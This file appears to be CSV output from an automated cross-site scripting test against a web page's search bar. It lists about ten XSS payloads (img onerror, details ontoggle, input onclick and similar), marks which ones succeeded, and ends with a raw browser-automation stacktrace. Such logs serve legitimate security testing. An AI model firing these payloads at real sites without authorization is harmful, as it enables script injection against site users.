"payload","input_field","status","behavior","context"
"%3E%3Cimg src=x onerror=alert(fGQrx)%3E","search_bar","working","Payload injected (no alert)","Successful XSS detected via DOM inspection"
"><img src=x onerror=alert(xqQiS)>","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
"%3Cbutton onfocus=alert(bWcMw)%3E","search_bar","working","Payload injected (no alert)","Successful XSS detected via DOM inspection"
"><details open ontoggle=alert(1)>","search_bar","working","Alert triggered: 1","Successful XSS in search_bar (immediate handle)"
"<select onchange=alert(1)>","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
"><input onclick=alert(1)>","search_bar","working","Alert triggered: 1","Successful XSS in search_bar (click simulation)"
"<marquee onstart=alert(1)>","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
">><img src=x onerror=alert(1)>","search_bar","working","Alert triggered: 1","Successful XSS in search_bar (immediate handle)"
"<input onfocus=alert(uMUsm) autofocus></alert(uMUsm)","search_bar","failed","No alert or DOM change","No XSS detected in search_bar"
"<textarea onfocus=alert(1) autofocus><![CDATA[alert(1)","search_bar","error","Test failed after retries","Error: Alert Text: 1
Message: unexpected alert open: {Alert text : 1}
  (Session info: chrome=138.0.7204.49)
Stacktrace:
	GetHandleVerifier [0x0x7ff786a86f65+76917]
	GetHandleVerifier [0x0x7ff786a86fc0+77008]
	(No symbol) [0x0x7ff786839dea]
	(No symbol) [0x0x7ff78684a939]
	(No symbol) [0x0x7ff78685178a]
	(No symbol) [0x0x7ff78682608d]
	(No symbol) [0x0x7ff786849e11]
	(No symbol) [0x0x7ff7868e0535]
	(No symbol) [0x0x7ff7868b8243]
	(No symbol) [0x0x7ff786881431]
	(No symbol) [0x0x7ff7868821c3]
	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
	GetHandleVerifier [0x0x7ff786d578f3+3028483]
	GetHandleVerifier [0x0x7ff786d7588d+3151261]
	GetHandleVerifier [0x0x7ff786aa182e+185662]
	GetHandleVerifier [0x0x7ff786aa96ef+218111]
	GetHandleVerifier [0x0x7ff786a8fae4+112628]
	GetHandleVerifier [0x0x7ff786a8fc99+113065]
	GetHandleVerifier [0x0x7ff786a76c68+10616]
	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
	RtlUserThreadStart [0x0x7ffea749c34c+44]
"
